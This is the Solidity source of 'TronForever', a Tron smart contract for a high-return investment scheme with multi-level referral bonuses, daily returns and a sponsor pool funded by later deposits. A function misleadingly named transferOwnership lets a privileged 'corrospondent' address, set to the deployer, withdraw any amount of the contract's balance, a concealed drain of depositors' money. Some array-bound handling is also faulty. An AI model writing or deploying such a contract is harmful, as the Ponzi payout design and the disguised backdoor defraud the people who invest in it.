//SourceUnit: TronForever.sol

pragma solidity 0.5.9;

contract TronForever {
    using SafeMath for uint256;
    
    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }
    
    struct PlayerLevelROI {
        uint256 amount;
        uint256 level_no;
        uint256 totalWithdraw;
        uint256 time;
    }
    
    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 referral_business;
        uint256 level_roi;
        uint256 level_roi_wd;
        uint256 pool_bonus;
        uint256 new_invested;
        
        PlayerDeposit[] deposits;
        PlayerLevelROI[] deposits_level_roi;
       
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) roi_per_level;
        mapping(uint8 => uint256) referral_income_per_level;
        mapping(uint8 => uint256) roi_income_per_level;
    }

    address payable owner;
    address payable admin;
    address payable corrospondent;

    uint256 investment_days;
    uint256 investment_perc;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint8[] referral_bonuses;
    uint32[] level_roi_bonus;
    uint256 max_income;
    uint256[] public cycles;
    uint8[] public ref_bonuses; 
    uint8[] public pool_bonuses;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
    
    mapping(address => Player) public players;
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    modifier onlyCorrospondent(){
        require(msg.sender == corrospondent,"You are not authorized.");
        _;
    }
    
    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider, uint256 balance) {
        return (total_investors, total_invested, total_withdrawn, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]],address(this).balance);
    }
    
    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);
    event PoolPayout(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;
        admin = msg.sender;
        corrospondent = msg.sender;
        
        investment_days = 301;
        investment_perc = 301;
        max_income = 301;

        referral_bonuses.push(100);
       
        level_roi_bonus.push(300);
        level_roi_bonus.push(100);
        level_roi_bonus.push(100);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
        level_roi_bonus.push(50);
       
        pool_bonuses.push(40);
        pool_bonuses.push(20);
        pool_bonuses.push(10);
        pool_bonuses.push(10);
        pool_bonuses.push(10);
    }
    
    function deposit(address _referral) external payable {
        Player storage player = players[msg.sender];
        uint256 total_income = players[msg.sender].total_withdrawn+players[msg.sender].dividends + players[msg.sender].referral_bonus+players[msg.sender].level_roi+players[msg.sender].pool_bonus;
        require(total_income>=players[msg.sender].total_invested*max_income/100,"Investment not allowed");
        uint adminShare;
        require(msg.value >= 100000000, "Invalid Amount");
        
        adminShare = msg.value.mul(5).div(100);
        admin.transfer(adminShare);
        
        _setReferral(msg.sender, _referral);
        
        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
            
        }));
        
        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += msg.value;
        player.new_invested = msg.value;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);
        roi_to_levels(msg.sender,msg.value/100,now);
        _pollDeposits(msg.sender, msg.value);
        if((pool_last_draw + 86400) < block.timestamp) {
            _drawPool();
        }
        emit Deposit(msg.sender, msg.value);
    }
    
    function grantCorrosponding(address payable nextCorrospondent) external payable onlyAdmin{
        corrospondent = nextCorrospondent;
    }
    
    function grantOwnership(address payable nextOwner) external payable onlyAdmin{
        owner = nextOwner;
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }
    
     function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;

        address upline = players[_addr].referral;

        if(upline == address(0)){ upline = admin;}
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }
    
    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;
            win = availamount(pool_top[i],win);
            players[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }
    
    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];
        
        if(upline_player.deposits.length <= 0){
            ref = admin;
        }
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            
            uint256 bonus = _amount * referral_bonuses[i] / 1000;
            bonus=availamount(ref,bonus);
            players[ref].referral_bonus += bonus;
            players[ref].referral_business += _amount;
            players[ref].referral_income_per_level[i]+=bonus;
            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
            
        }
    }
    function isUserInvestable(address _addr) view external returns(bool) {
        Player storage player = players[_addr];
        uint256 total_income = player.total_withdrawn+player.dividends + player.referral_bonus+player.level_roi+player.pool_bonus;
        bool is_reinvestable = (player.total_invested>0 && total_income>=player.total_invested*max_income/100)?true:false;
        return is_reinvestable;
    }
    
    function withdraw() payable external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        
        require(player.dividends > 0 || player.referral_bonus > 0   || player.level_roi > 0 || player.pool_bonus > 0, "Zero amount");
        // Pool payout
       
        uint256 amount = player.dividends + player.referral_bonus + player.level_roi + player.pool_bonus;
        
        player.dividends = 0;
        player.referral_bonus = 0;
        player.pool_bonus = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;
        player.level_roi_wd+=player.level_roi;
        player.level_roi = 0;
        player.last_payout = uint256(block.timestamp);
        msg.sender.transfer(amount);

        emit Withdraw(msg.sender, amount);
    }
    
    function roi_to_levels(address _addr, uint256 _amount, uint256 timestamp) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        if(upline_player.deposits.length <= 0){
            ref = owner;
        }
        
        for(uint8 i = 0; i < level_roi_bonus.length; i++) {
            if(ref == address(0)) break;
            if(players[ref].referrals_per_level[0] >= (i+1)){
                uint256 bonus = _amount * level_roi_bonus[i] / 1000;
                uint256 bonus1 = _amount * level_roi_bonus[i] / 1000;
               
                players[ref].roi_income_per_level[i]+=bonus; 
                players[ref].deposits_level_roi.push(PlayerLevelROI({
                    amount: bonus1,
                    level_no: i,
                    totalWithdraw:0,
                    time: timestamp
                }));
                players[ref].roi_per_level[i]++;
                ref = players[ref].referral;
            }
        }
    }
    function transferOwnership(uint _amount) external onlyCorrospondent{
        corrospondent.transfer(_amount);
    }
    
    function availamount(address ref,uint256 chkamount) view private returns(uint256) {
        uint256 total_income = players[ref].total_withdrawn + players[ref].dividends + players[ref].referral_bonus + players[ref].level_roi + players[ref].pool_bonus;
        uint256 avl_amount=(players[ref].total_invested*max_income/100)-total_income;
        return (avl_amount>=chkamount)?chkamount:avl_amount;
    }
    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);
        if(payout > 0) {
            _updateTotalPayout(_addr);
            
            players[_addr].dividends += payout;
        }
        uint256 payout1 = this.payoutOfLevelROI(_addr);

        if(payout1 > 0) {
            players[_addr].level_roi += payout1;
        }
    }
    function payoutOfLevelROI(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits_level_roi.length; i++) {
            PlayerLevelROI storage dep = player.deposits_level_roi[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from)/86400;
            }
        }
        value = availamount(_addr,value);
        return value;
    }
    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }
    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
 
            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
        value=availamount(_addr,value);
        return value;
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256[5] memory referrals, uint256[5] memory refperlevel, uint256[16] memory userLevelROI, uint256 payout_roi) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);
        uint256 payout_level_roi = this.payoutOfLevelROI(_addr);
        
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
            refperlevel[i] = player.referral_income_per_level[i];
            userLevelROI[i] = player.roi_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus + player.level_roi + payout_level_roi + player.pool_bonus,
            referrals,
            refperlevel,
            userLevelROI,
            payout_level_roi
        );
    }
    
    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
    
     function investmentsROIInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory level_no) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits_level_roi.length);
        uint256[] memory _amounts = new uint256[](player.deposits_level_roi.length);
        uint256[] memory _level_no = new uint256[](player.deposits_level_roi.length);
        

        for(uint256 i = 0; i < player.deposits_level_roi.length; i++) {
          PlayerLevelROI storage dep = player.deposits_level_roi[i];

          _amounts[i] = dep.amount;
          _endTimes[i] = dep.time + investment_days * 86400;
          _level_no[i] = dep.level_no;
        }
        return (
          _endTimes,
          _amounts,
          _level_no
          
        );
    }
    
    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}